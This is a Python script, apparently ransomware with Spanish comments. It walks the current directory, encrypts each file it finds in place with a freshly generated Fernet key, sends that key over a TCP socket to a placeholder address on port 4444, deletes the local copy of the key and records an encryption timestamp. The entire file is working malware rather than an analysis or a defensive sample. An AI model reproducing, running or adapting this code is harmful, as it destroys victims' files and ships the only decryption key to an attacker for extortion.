import os
import subprocess
import sys
import time
import tkinter as tk
import socket
from datetime import datetime

"""
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
install("cryptography")
"""

from cryptography.fernet import Fernet

files = [] # Se deja vacio porque no sabemos que es lo que hay

IP = '192.168.x.xx'

port = '4444'

def file_tree(directory):
    global files
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory,file)
            if not os.path.isdir(rute_element):
                file_tree(rute_element)
            if file == "Encripter.py" or file == "key.key" or file == "desencripter.py" or file == "encrypt_time.txt" or file == "EncripterLinux.py":
                continue
            if os.path.isfile(rute_element):
                files.append(rute_element)
            print(files)
    except Exception as e:
        pass

def enviar_contenido_archivo(ip, puerto, nombre_archivo):
    try:
        # Crear un socket TCP/IP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Conectar el socket al servidor
        s.connect((ip, puerto))
        
        # Leer el archivo y enviar su contenido
        with open(nombre_archivo, "rb") as archivo:
            contenido = archivo.read()
            s.sendall(contenido)
        
        print("Contenido del archivo enviado exitosamente.")

        os.remove('key.key')
        
    except Exception as e:
        print(f"Error: {e}")
        
    finally:
        # Cerrar la conexión
        s.close()

file_tree("./")

key = Fernet.generate_key()

with open("key.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    try:
        with open(file, 'rb') as f:
            data = f.read()
        data_encrypted = Fernet(key).encrypt(data)
        with open(file, 'wb') as f:
            f.write(data_encrypted)
    except:
        pass

if __name__ == "__main__":
    ip_destino = "192.168.x.xx"
    puerto_destino = 4444
    archivo_a_enviar = "key.key"
    
    enviar_contenido_archivo(ip_destino, puerto_destino, archivo_a_enviar)
with open("encrypt_time.txt", "w") as f:
    f.write(str(datetime.now()))
